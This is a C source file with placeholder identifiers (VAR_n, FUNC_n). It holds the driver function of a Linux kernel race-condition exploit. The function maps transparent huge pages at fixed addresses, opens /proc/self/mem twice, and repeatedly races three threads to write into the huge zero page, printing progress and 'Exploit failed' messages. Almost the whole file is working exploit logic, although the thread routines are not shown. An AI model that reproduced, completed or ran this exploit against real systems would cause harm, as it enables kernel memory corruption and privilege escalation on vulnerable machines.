
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct thread_args {void* thp_map; void* thp_chk_map; scalar_t__ mem_fd1; scalar_t__ mem_fd2; int off; int buf_to_write; scalar_t__ stop; } ;
typedef int pthread_t ;
typedef int pthread_proc ;


 int VAR_0 ;
 int VAR_1 ;
 void* VAR_2 ;
 void* VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 scalar_t__ VAR_8 ;
 int VAR_9 ;
 int FUNC_0 (scalar_t__) ;
 int FUNC_1 (int ,char*) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (void*,int,int ) ;
 int FUNC_4 (scalar_t__) ;
 int FUNC_5 (int ,int ,scalar_t__) ;
 void* FUNC_6 (void*,int,int ,int,int,int ) ;
 int FUNC_7 (void*,int) ;
 void* FUNC_8 (char*,int ) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int *,int *,int ,struct thread_args*) ;
 int FUNC_12 (int ,int *) ;
 int VAR_10 ;
 scalar_t__ VAR_11 ;
 scalar_t__ VAR_12 ;
 scalar_t__ VAR_13 ;

int FUNC_13() {
    struct thread_args VAR_14;
    void *VAR_15;
    int VAR_16;


    VAR_14.thp_map = FUNC_6(VAR_2, VAR_5, VAR_9, VAR_4 | VAR_1, -1, 0);
    if (VAR_14.thp_map == VAR_3) {
        FUNC_9("[!] mmap()");
        return -1;
    }
    if (VAR_14.thp_map != VAR_2) {
        FUNC_1(VAR_10, "[!] Didn't get desired base address for the vulnerable mapping.\n");
        goto err_unmap1;
    }

    FUNC_10("[*] The beginning of the zero huge page: %lx\n", *(unsigned long *)VAR_14.thp_map);

    VAR_15 = (char *)VAR_2 + (VAR_5 * 2);
    VAR_14.thp_chk_map = FUNC_6(VAR_15, VAR_5, VAR_9, VAR_4 | VAR_1, -1, 0);
    if (VAR_14.thp_chk_map == VAR_3) {
        FUNC_9("[!] mmap()");
        goto err_unmap1;
    }
    if (VAR_14.thp_chk_map != VAR_15) {
        FUNC_1(VAR_10, "[!] Didn't get desired base address for the check mapping.\n");
        goto err_unmap2;
    }

    VAR_16 = FUNC_3(VAR_14.thp_map, VAR_5, VAR_0);
    VAR_16 |= FUNC_3(VAR_14.thp_chk_map, VAR_5, VAR_0);
    if (VAR_16) {
        FUNC_9("[!] madvise()");
        goto err_unmap2;
    }

    VAR_14.buf_to_write = FUNC_4(VAR_8);
    if (!VAR_14.buf_to_write) {
        FUNC_9("[!] malloc()");
        goto err_unmap2;
    }
    FUNC_5(VAR_14.buf_to_write, VAR_6, VAR_8);

    VAR_14.mem_fd1 = FUNC_8("/proc/self/mem", VAR_7);
    if (VAR_14.mem_fd1 < 0) {
        FUNC_9("[!] open()");
        goto err_free;
    }

    VAR_14.mem_fd2 = FUNC_8("/proc/self/mem", VAR_7);
    if (VAR_14.mem_fd2 < 0) {
        FUNC_9("[!] open()");
        goto err_close1;
    }

    FUNC_10("[*] Racing. Gonna take a while...\n");
    VAR_14.off = 0;


    while (VAR_14.off < VAR_5) {
        pthread_t VAR_17[3];
        VAR_14.stop = 0;

        VAR_16 = FUNC_11(&VAR_17[0], ((void*)0), (pthread_proc)VAR_12, &VAR_14);
        VAR_16 |= FUNC_11(&VAR_17[1], ((void*)0), (pthread_proc)VAR_11, &VAR_14);
        VAR_16 |= FUNC_11(&VAR_17[2], ((void*)0), (pthread_proc)VAR_13, &VAR_14);

        if (VAR_16) {
            FUNC_9("[!] pthread_create()");
            goto err_close2;
        }

        FUNC_12(VAR_17[0], ((void*)0));
        FUNC_12(VAR_17[1], ((void*)0));
        FUNC_12(VAR_17[2], ((void*)0));

        VAR_14.off += VAR_8;
        FUNC_10("[*] Done 0x%lx bytes\n", VAR_14.off);
    }

    FUNC_10("[*] Success!\n");

err_close2:
    FUNC_0(VAR_14.mem_fd2);
err_close1:
    FUNC_0(VAR_14.mem_fd1);
err_free:
    FUNC_2(VAR_14.buf_to_write);
err_unmap2:
    FUNC_7(VAR_14.thp_chk_map, VAR_5);
err_unmap1:
    FUNC_7(VAR_14.thp_map, VAR_5);

    if (VAR_16) {
        FUNC_1(VAR_10, "[!] Exploit failed.\n");
    }

    return VAR_16;
}
